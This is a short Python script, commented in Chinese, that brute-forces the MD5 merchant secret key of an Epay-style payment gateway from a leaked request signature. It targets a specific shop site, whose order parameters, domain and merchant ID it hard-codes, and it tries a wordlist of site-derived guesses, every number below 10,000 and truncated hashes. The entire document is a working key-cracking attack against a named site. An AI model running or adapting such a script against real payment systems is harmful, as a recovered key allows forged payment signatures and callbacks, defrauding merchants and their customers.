#!/usr/bin/env python3
"""从 submit 泄露的 sign 反推易支付商户 key"""
import hashlib, itertools, urllib.parse

params = {
    "money": "9999",
    "name": "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x 唯一的U地址",
    "notify_url": "https://hmjf.lol/shop/other/epay_notify.php",
    "out_trade_no": "20260716030008400",
    "pid": "1003",
    "return_url": "https://hmjf.lol/shop/other/epay_return.php",
    "sitename": "虚心U自动发卡",
    "type": "alipay",
}
TARGET = "58886ad7b7be5af3c2606f86313c807d"

def sign(p, key, enc_name=False):
    items = sorted((k, v) for k, v in p.items() if v and k not in ("sign", "sign_type"))
    parts = []
    for k, v in items:
        if k == "name" and enc_name:
            v = urllib.parse.quote(v, safe="")
        parts.append(f"{k}={v}")
    s = "&".join(parts) + key
    return hashlib.md5(s.encode()).hexdigest()

# 词表 + 商品名衍生
base = [
    "", "123456", "123456789", "12345678", "1003", "hmjf", "xuxin", "ttwl66",
    "api.ttwl66.cn", "datou111", "datou333", "hmjf.lol", "xuxin66vip", "faka",
    "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x", "58886ad7b7be5af3c2606f86313c807d",
    "虚心U", "虚心U自动发卡", "02E76F93", "A0FFB679553D", "shua", "caihong",
]
# 短数字
base += [str(i) for i in range(10000)]
# md5 截断
for b in list(base)[:20]:
    base.append(hashlib.md5(b.encode()).hexdigest()[:16])

names = [
    params["name"],
    "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x 唯一的U地址",
    "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x",
    urllib.parse.quote(params["name"]),
]

hits = []
for key in base:
    for name in names:
        for enc in (False, True):
            p = dict(params, name=name)
            if sign(p, key, enc) == TARGET:
                hits.append({"key": key, "name": name, "enc": enc})
                print("HIT", hits[-1])

if not hits:
    print("no hit in", len(base), "keys")
